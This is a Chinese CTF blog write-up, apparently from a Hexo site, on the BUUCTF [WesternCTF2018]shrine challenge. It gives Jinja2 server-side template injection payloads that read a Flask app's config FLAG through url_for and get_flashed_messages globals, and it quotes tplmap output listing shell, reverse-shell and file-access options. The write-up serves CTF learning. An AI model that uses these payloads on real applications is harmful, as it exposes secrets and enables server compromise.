@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="做题过程中，越来越感觉需要实际的开发经验才能够知其所以然。后期要多补补开发经验。 payload123456格式url&#x2F;shrine&#x2F;&amp;#123;&amp;#123;tpl&amp;#125;&amp;#125;获取flag&amp;#123;&amp;#123;url_for.__globals__[&amp;#x27;current_app&amp;#x27;].config.FLAG&amp;#125;&amp;#125;&amp;#123;&amp;#123;get_flas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self">
+<meta property="og:url" content="http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="做题过程中，越来越感觉需要实际的开发经验才能够知其所以然。后期要多补补开发经验。 payload123456格式url&#x2F;shrine&#x2F;&amp;#123;&amp;#123;tpl&amp;#125;&amp;#125;获取flag&amp;#123;&amp;#123;url_for.__globals__[&amp;#x27;current_app&amp;#x27;].config.FLAG&amp;#125;&amp;#125;&amp;#123;&amp;#123;get_flas">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-20T10:17:27.000Z">
+<meta property="article:modified_time" content="2022-04-20T10:30:11.389Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/04/20/BUUCTF-WEB-De1CTF-2019-SSRF-Me-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&text=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&title=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&is_video=false&description=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self&body=Check out this article: http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&title=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&title=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&title=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&title=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&name=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&t=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tql%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">tql使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/" class="leancloud-visitors" data-flag-title="BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-20T10:17:27.000Z" itemprop="datePublished">2022-04-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/WEB/" rel="tag">WEB</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>做题过程中，越来越感觉需要实际的开发经验才能够知其所以然。后期要多补补开发经验。</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">格式</span><br><span class="line">url/shrine/&#123;&#123;tpl&#125;&#125;</span><br><span class="line"></span><br><span class="line">获取flag</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="tql使用"><a href="#tql使用" class="headerlink" title="tql使用"></a>tql使用</h2><p>很遗憾，这个注入没有参数，tpl需要魔改才可以，要注意tpl用的是py2</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ ./tplmap.py -u <span class="string">&#x27;http://www.target.com/page?name=John&#x27;</span></span><br><span class="line">[+] Tplmap 0.5</span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing <span class="keyword">if</span> GET parameter <span class="string">&#x27;name&#x27;</span> is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag <span class="string">&#x27;&#123;*&#125;&#x27;</span></span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag <span class="string">&#x27;$&#123;*&#125;&#x27;</span></span><br><span class="line">...</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag <span class="string">&#x27;&#123;&#123;*&#125;&#125;&#x27;</span></span><br><span class="line">[+] Jinja2 plugin has confirmed injection with tag <span class="string">&#x27;&#123;&#123;*&#125;&#125;&#x27;</span></span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: name</span><br><span class="line">  Engine: Jinja2</span><br><span class="line">  Injection: &#123;&#123;*&#125;&#125;</span><br><span class="line">  Context: text</span><br><span class="line">  OS: linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell <span class="built_in">command</span> execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File <span class="built_in">read</span>: ok</span><br><span class="line">   Code evaluation: ok, python code</span><br><span class="line"></span><br><span class="line">[+] Rerun tplmap providing one of the following options:</span><br><span class="line"></span><br><span class="line">    --os-shell                Run shell on the target</span><br><span class="line">    --os-cmd                  Execute shell commands</span><br><span class="line">    --bind-shell PORT         Connect to a shell <span class="built_in">bind</span> to a target port</span><br><span class="line">    --reverse-shell HOST PORT Send a shell back to the attacker<span class="string">&#x27;s port</span></span><br><span class="line"><span class="string">    --upload LOCAL REMOTE     Upload files to the server</span></span><br><span class="line"><span class="string">    --download REMOTE LOCAL   Download remote files</span></span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/93746437">CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】</a> 非常好，推荐</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tql%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">tql使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&text=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&title=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&is_video=false&description=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self&body=Check out this article: http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&title=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&title=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&title=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&title=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&name=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/&t=BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
